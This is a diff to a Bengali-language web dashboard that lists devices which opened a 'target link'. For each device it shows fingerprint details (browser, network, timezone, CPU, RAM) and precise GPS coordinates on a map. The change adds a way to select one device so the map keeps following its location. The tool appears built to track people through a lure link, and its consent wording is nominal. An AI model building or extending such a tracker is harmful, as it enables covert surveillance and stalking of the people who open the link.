@@ -13,7 +13,8 @@
         #map { height: 100%; width: 100%; }
         .info-panel { flex: 1; min-width: 300px; background: #1e293b; border-radius: 15px; padding: 20px; height: 500px; overflow-y: auto; }
         .info-panel h2 { font-size: 18px; margin-bottom: 15px; border-bottom: 2px solid #334155; padding-bottom: 10px; }
-        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; }
+        .device-card { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid #38bdf8; cursor: pointer; transition: 0.2s; }
+        .device-card:hover { background: #1e293b; transform: scale(1.02); }
         .device-card .name { font-weight: bold; font-size: 16px; color: #38bdf8; }
         .device-card .detail { font-size: 13px; color: #94a3b8; margin-top: 6px; line-height: 1.4; }
         .device-card .detail b { color: #e2e8f0; }
@@ -28,7 +29,7 @@
             <div id="map"></div>
         </div>
         <div class="info-panel">
-            <h2>📱 কানেক্টেড ডিভাইস</h2>
+            <h2>📱 কানেক্টেড ডিভাইস <span style="font-size:12px; color:#64748b;">(লোকেশন দেখতে ক্লিক করুন)</span></h2>
             <div id="deviceList">
                 <div class="no-data">কোনো ডিভাইস কানেক্ট হয়নি।<br>টার্গেট লিংকটি খুলে সম্মতি দিন।</div>
             </div>
@@ -44,6 +45,9 @@
         
         let markers = {};
         let circles = {};
+        
+        // এই ভেরিয়েবলটি মনে রাখবে আমরা কোন ডিভাইসটি সিলেক্ট করেছি
+        let selectedDeviceId = null; 
 
         function fetchClients() {
             fetch('/api/clients')
@@ -69,6 +73,14 @@
                         const card = document.createElement('div');
                         card.className = 'device-card online';
                         
+                        // কার্ডে ক্লিক করলে ম্যাপ সেই ডিভাইসে চলে যাবে
+                        card.onclick = () => {
+                            selectedDeviceId = id;
+                            if (data.lat && data.lng) {
+                                map.setView([parseFloat(data.lat), parseFloat(data.lng)], 16);
+                            }
+                        };
+                        
                         card.innerHTML = `
                             <div class="name">📱 ${data.device || 'অজানা ডিভাইস'}</div>
                             <div class="detail">🌐 ব্রাউজার: <b>${data.browser || 'N/A'}</b></div>
@@ -76,7 +88,7 @@
                             <div class="detail">📶 নেটওয়ার্ক: <b>${data.network || 'N/A'}</b></div>
                             <div class="detail">🗣️ ভাষা: <b>${data.language || 'N/A'}</b></div>
                             <div class="detail">🕒 টাইমজোন: <b>${data.timezone || 'N/A'}</b></div>
-                            <div class="detail">🖥️ স্ক্রিন: <b>${data.screen || 'N/A'}</b> | পিক্সেল রেশিও: <b>${data.pixelRatio}</b></div>
+                            <div class="detail">🖥️ স্ক্রিন: <b>${data.screen || 'N/A'}</b></div>
                             <div class="detail">⚙️ CPU কোর: <b>${data.cores}</b> | RAM: <b>${data.memory}</b></div>
                             <div class="detail" style="margin-top:10px; padding-top:10px; border-top: 1px solid #334155;">
                                 📍 অবস্থান: <b>${data.lat ? parseFloat(data.lat).toFixed(5) : 'N/A'}, ${data.lng ? parseFloat(data.lng).toFixed(5) : ''}</b><br>
@@ -86,6 +98,7 @@
                         `;
                         list.appendChild(card);
 
+                        // ম্যাপে মার্কার আপডেট করা
                         if (data.lat && data.lng) {
                             const pos = [parseFloat(data.lat), parseFloat(data.lng)];
                             const acc = data.accuracy ? parseFloat(data.accuracy) : 50;
@@ -101,10 +114,10 @@
                                 const circle = L.circle(pos, { radius: acc, color: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
                                 circles[id] = circle;
                             }
-                            // ম্যাপে প্রথমবার লোড হলে জুম করবে, বারবার জুম হবে না
-                            if (Object.keys(markers).length === 1 && !window.initialZoomDone) {
-                                map.setView(pos, 15);
-                                window.initialZoomDone = true;
+                            
+                            // যদি এই ডিভাইসটিই সিলেক্ট করা থাকে, তবেই ম্যাপ তাকে ফলো করবে
+                            if (selectedDeviceId === id) {
+                                map.setView(pos, 16);
                             }
                         }
                     });
